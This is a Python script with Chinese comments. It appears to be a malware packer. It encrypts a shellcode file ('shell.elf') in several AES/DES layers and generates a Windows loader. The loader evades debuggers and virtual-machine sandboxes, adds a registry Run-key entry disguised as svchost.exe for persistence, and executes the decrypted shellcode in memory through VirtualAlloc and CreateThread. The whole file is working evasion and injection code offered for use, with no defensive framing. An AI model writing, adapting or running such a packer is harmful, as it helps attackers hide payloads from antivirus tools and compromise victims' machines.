import os
import zlib
import random
import hashlib
from base64 import b64encode
from Crypto.Cipher import AES, DES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# === 设置主密钥与派生信息 ===
MASTER_SECRET = get_random_bytes(32)
SALT = get_random_bytes(8)

def derive_key(secret: bytes, salt: bytes, length: int = 32):
    return hashlib.pbkdf2_hmac("sha256", secret, salt, 100000, dklen=length)

AES_KEY = derive_key(MASTER_SECRET, SALT, 32)
AES_IV = derive_key(MASTER_SECRET[::-1], SALT, 16)
DES_KEY = derive_key(MASTER_SECRET, SALT[::-1], 8)
DES_IV = derive_key(MASTER_SECRET[::-1], SALT[::-1], 8)

# === 数据加密 ===
def add_obfuscation(data):
    return data + b'\x00\xFF'

def encrypt_data(data, key, iv, alg):
    cipher = AES.new(key, AES.MODE_CBC, iv) if alg == 'AES' else DES.new(key, DES.MODE_CBC, iv)
    return cipher.encrypt(pad(data, AES.block_size if alg == 'AES' else DES.block_size))

def multi_layer_encrypt(data, layers=8):
    algs = []
    for _ in range(layers):
        data = zlib.compress(data)
        data = add_obfuscation(data)
        alg = random.choice(['AES', 'DES'])
        key = AES_KEY if alg == 'AES' else DES_KEY
        iv = AES_IV if alg == 'AES' else DES_IV
        data = encrypt_data(data, key, iv, alg)
        algs.append(alg)
    return data, algs

# === 自动控制流混淆模块 ===
def control_flow_obfuscation(code):
    lines = code.splitlines()
    obf = []
    for line in lines:
        indent = len(line) - len(line.lstrip())
        if indent > 0 and random.random() > 0.8:
            obf.append(' ' * indent + "if random.random() < 0.99: pass  # control flow noise")
        obf.append(line)
    return '\n'.join(obf)

# === 壳体生成 ===
def generate_advanced_shell(payload_b64, algorithms_used):
    def obfs_str(s):  # 字符串混淆
        return '+'.join(f'chr({ord(c)})' for c in s)

    reg_key = obfs_str("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    exe_name = obfs_str("TempProcess")

    shell = f'''
# -*- coding: utf-8 -*-
import ctypes, base64, zlib, time, random, hashlib, platform, winreg
from Crypto.Cipher import AES, DES
from Crypto.Util.Padding import unpad

# 派生密钥
_salt = base64.b64decode("{b64encode(SALT).decode()}")
_secret = base64.b64decode("{b64encode(MASTER_SECRET).decode()}")

def derive(secret, salt, length):
    return hashlib.pbkdf2_hmac("sha256", secret, salt, 100000, dklen=length)

def k(alg):
    if alg == 'AES':
        return derive(_secret, _salt, 32), derive(_secret[::-1], _salt, 16)
    else:
        return derive(_secret, _salt[::-1], 8), derive(_secret[::-1], _salt[::-1], 8)

# 沙箱和调试器检测
def is_debugged(): return ctypes.windll.kernel32.IsDebuggerPresent()
def is_vm(): return any(x in platform.platform().lower() for x in ["vbox","vmware","qemu","sandbox"])

# 多层解密
def decrypt(data, key, iv, alg):
    cipher = AES.new(key, AES.MODE_CBC, iv) if alg == 'AES' else DES.new(key, DES.MODE_CBC, iv)
    return unpad(cipher.decrypt(data), AES.block_size if alg == 'AES' else DES.block_size)

def decode_all(data, algs):
    for alg in reversed(algs):
        key, iv = k(alg)
        data = decrypt(data, key, iv, alg)
        if data.endswith(b'\\x00\\xFF'):
            data = data[:-2]
        data = zlib.decompress(data)
    return data

# 模拟正常进程行为
def fake_registry_entry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "".join([{reg_key}]), 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "".join([{exe_name}]), 0, winreg.REG_SZ, "C:\\\\Windows\\\\System32\\\\svchost.exe")
        winreg.CloseKey(key)
    except:
        pass

# API 跳转扰动
def fake_api_jumps():
    ptr = ctypes.windll.kernel32.GetProcAddress(ctypes.windll.kernel32.GetModuleHandleW(None), None)
    return ptr

# 内存执行
def mem_exec(buf):
    ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(buf), 0x3000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(buf))
    th = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)
    ctypes.windll.kernel32.WaitForSingleObject(th, -1)

if __name__ == "__main__":
    if is_debugged() or is_vm():
        exit()
    time.sleep(random.randint(3, 7))
    fake_registry_entry()
    fake_api_jumps()
    blob = base64.b64decode("{payload_b64}")
    algs = {algorithms_used!r}
    decoded = decode_all(blob, algs)
    mem_exec(decoded)
'''
    return control_flow_obfuscation(shell)

# === 总控入口 ===
def pack_ultra_shell(input_file, output_file):
    with open(input_file, 'rb') as f:
        raw = f.read()

    protected, algs = multi_layer_encrypt(raw)
    encoded = b64encode(protected).decode()
    shell_code = generate_advanced_shell(encoded, algs)

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(shell_code)

    print(f"✅ Shell creat by UTF-8：{output_file}")

pack_ultra_shell("shell.elf", "ultra_shell.py")
